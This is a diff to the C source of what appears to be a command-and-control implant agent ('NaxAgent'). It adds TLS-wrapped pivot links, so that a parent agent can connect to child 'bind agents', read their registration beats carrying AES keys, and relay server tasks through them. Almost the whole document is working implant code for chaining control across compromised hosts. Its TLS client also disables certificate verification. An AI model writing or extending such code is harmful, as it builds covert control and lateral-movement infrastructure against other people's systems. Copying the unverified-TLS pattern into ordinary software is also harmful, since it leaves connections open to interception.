@@ -5,6 +5,9 @@
  */
 
 #include "nax_linux.h"
+#include <pthread.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -762,6 +765,7 @@ static void pivot_remove(NaxAgent *a, uint32_t pivot_id)
     while (*pp) {
         NaxPivot *p = *pp;
         if (p->pivot_id == pivot_id) {
+            if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
             if (p->sock >= 0) close(p->sock);
             *pp = p->next;
             free(p);
@@ -771,11 +775,12 @@ static void pivot_remove(NaxAgent *a, uint32_t pivot_id)
     }
 }
 
-static void pivot_add(NaxAgent *a, int sock, uint32_t pivot_id)
+static void pivot_add(NaxAgent *a, int sock, void *ssl, uint32_t pivot_id)
 {
     NaxPivot *p = (NaxPivot *)malloc(sizeof(NaxPivot));
-    if (!p) { close(sock); return; }
+    if (!p) { if (ssl) { SSL_shutdown((SSL*)ssl); SSL_free((SSL*)ssl); } close(sock); return; }
     p->sock     = sock;
+    p->ssl      = ssl;
     p->pivot_id = pivot_id;
     p->next     = a->pivot_head;
     a->pivot_head = p;
@@ -810,21 +815,100 @@ static uint8_t cmd_pivot_exec(NaxAgent *a, NaxTask *t,
         (uint8_t)(data_len), (uint8_t)(data_len >> 8),
         (uint8_t)(data_len >> 16), (uint8_t)(data_len >> 24)
     };
-    if (send(p->sock, hdr, 4, MSG_NOSIGNAL) != 4) {
-        pivot_remove(a, pivot_id);
-        return NAX_STATUS_OK;
+    /* Send length header */
+    {
+        uint32_t hsent = 0;
+        int retries = 0;
+        while (hsent < 4) {
+            ssize_t r = p->ssl
+                ? SSL_write((SSL*)p->ssl, hdr + hsent, (int)(4 - hsent))
+                : send(p->sock, hdr + hsent, 4 - hsent, MSG_NOSIGNAL);
+            if (r > 0) { hsent += (uint32_t)r; retries = 0; continue; }
+            if (p->ssl) {
+                int e = SSL_get_error((SSL*)p->ssl, (int)r);
+                if ((e == SSL_ERROR_WANT_WRITE || e == SSL_ERROR_WANT_READ) && ++retries < 100) { usleep(1000); continue; }
+            }
+            pivot_remove(a, pivot_id); return NAX_STATUS_OK;
+        }
     }
-    ssize_t sent = 0;
-    while ((uint32_t)sent < data_len) {
-        ssize_t r = send(p->sock, data + sent, data_len - (uint32_t)sent, MSG_NOSIGNAL);
-        if (r <= 0) { pivot_remove(a, pivot_id); return NAX_STATUS_OK; }
-        sent += r;
+    /* Send body */
+    {
+        uint32_t dsent = 0;
+        int retries = 0;
+        while (dsent < data_len) {
+            ssize_t r = p->ssl
+                ? SSL_write((SSL*)p->ssl, data + dsent, (int)(data_len - dsent))
+                : send(p->sock, data + dsent, data_len - dsent, MSG_NOSIGNAL);
+            if (r > 0) { dsent += (uint32_t)r; retries = 0; continue; }
+            if (p->ssl) {
+                int e = SSL_get_error((SSL*)p->ssl, (int)r);
+                if ((e == SSL_ERROR_WANT_WRITE || e == SSL_ERROR_WANT_READ) && ++retries < 100) { usleep(1000); continue; }
+            }
+            pivot_remove(a, pivot_id); return NAX_STATUS_OK;
+        }
     }
     return NAX_STATUS_OK;
 }
 
 /* helpers shared with tcp_bind.c — declared extern */
 extern int tcp_recv_exact_pub(int sock, uint8_t *buf, uint32_t len);
+
+/* ===== TLS client for connecting to bind agents ===== */
+static SSL_CTX *g_link_ssl_ctx = NULL;
+static pthread_once_t g_link_ssl_once = PTHREAD_ONCE_INIT;
+
+static void _link_ssl_ctx_init(void) {
+    g_link_ssl_ctx = SSL_CTX_new(TLS_client_method());
+    if (!g_link_ssl_ctx) return;
+    SSL_CTX_set_verify(g_link_ssl_ctx, SSL_VERIFY_NONE, NULL);
+    SSL_CTX_set_mode(g_link_ssl_ctx, SSL_MODE_AUTO_RETRY);
+}
+
+static SSL *link_tls_connect(int sock) {
+    pthread_once(&g_link_ssl_once, _link_ssl_ctx_init);
+    if (!g_link_ssl_ctx) return NULL;
+    SSL *ssl = SSL_new(g_link_ssl_ctx);
+    if (!ssl) return NULL;
+    SSL_set_fd(ssl, sock);
+    if (SSL_connect(ssl) <= 0) {
+        SSL_free(ssl);
+        return NULL;
+    }
+    return ssl;
+}
+
+static int link_tls_lp_recv(SSL *ssl, uint8_t **out, uint32_t *out_len) {
+    uint8_t hdr[4];
+    int got = 0, retries = 0;
+    while (got < 4) {
+        int r = SSL_read(ssl, hdr + got, 4 - got);
+        if (r > 0) { got += r; retries = 0; continue; }
+        int e = SSL_get_error(ssl, r);
+        if ((e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) && ++retries < 100) { usleep(1000); continue; }
+        return -1;
+    }
+    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1]<<8) |
+                   ((uint32_t)hdr[2]<<16) | ((uint32_t)hdr[3]<<24);
+    if (!len || len > NAX_IO_CAP) return -1;
+    *out = malloc(len);
+    if (!*out) return -1;
+    got = 0; retries = 0;
+    while ((uint32_t)got < len) {
+        int r = SSL_read(ssl, *out + got, (int)(len - got));
+        if (r > 0) { got += r; retries = 0; continue; }
+        int e = SSL_get_error(ssl, r);
+        if ((e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE) && ++retries < 100) { usleep(1000); continue; }
+        free(*out); *out = NULL; return -1;
+    }
+    *out_len = len;
+    return 0;
+}
+
+/* Called only during agent shutdown — g_link_ssl_ctx is never recreated.
+ * pthread_once guarantees init runs once; cleanup is final. */
+void nax_link_tls_cleanup(void) {
+    if (g_link_ssl_ctx) { SSL_CTX_free(g_link_ssl_ctx); g_link_ssl_ctx = NULL; }
+}
 
 static int cmd_link_lp_recv(int sock, uint8_t **out, uint32_t *out_len) {
     uint8_t hdr[4];
@@ -914,10 +998,20 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
     }
     freeaddrinfo(res);
 
-    /* Read the child's REGISTER beat (length-prefixed) */
+    /* TLS handshake with child bind agent */
+    SSL *child_ssl = link_tls_connect(csock);
+    if (!child_ssl) {
+        close(csock);
+        const char *msg = "link: TLS handshake with child failed";
+        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+        return NAX_STATUS_ERR;
+    }
+
+    /* Read the child's REGISTER beat (length-prefixed, over TLS) */
     uint8_t  *beat     = NULL;
     uint32_t  beat_len = 0;
-    if (cmd_link_lp_recv(csock, &beat, &beat_len) < 0 || beat_len < 20) {
+    if (link_tls_lp_recv(child_ssl, &beat, &beat_len) < 0 || beat_len < 20) {
+        SSL_free(child_ssl);
         close(csock);
         const char *msg = "link: failed to read child beat";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
@@ -930,7 +1024,7 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
      * InternalHandler uses aes_key to correctly register the child
      * regardless of which transport the parent uses. */
     if (beat_len < 36) { /* wm(4) + key(16) + sid(16) minimum */
-        free(beat); close(csock);
+        free(beat); SSL_shutdown(child_ssl); SSL_free(child_ssl); close(csock);
         const char *msg = "link: child beat too short";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
         return NAX_STATUS_ERR;
@@ -956,7 +1050,7 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
     memcpy(result + 5, beat + 4, beat_len - 4); /* aes_key + sessionId + encrypted_register */
     free(beat);
 
-    pivot_add(a, csock, t->task_id);  /* task_id == pivot_id assigned by server */
+    pivot_add(a, csock, (void *)child_ssl, t->task_id);  /* task_id == pivot_id assigned by server */
     *out     = result;
     *out_len = result_len;
     return NAX_STATUS_OK;
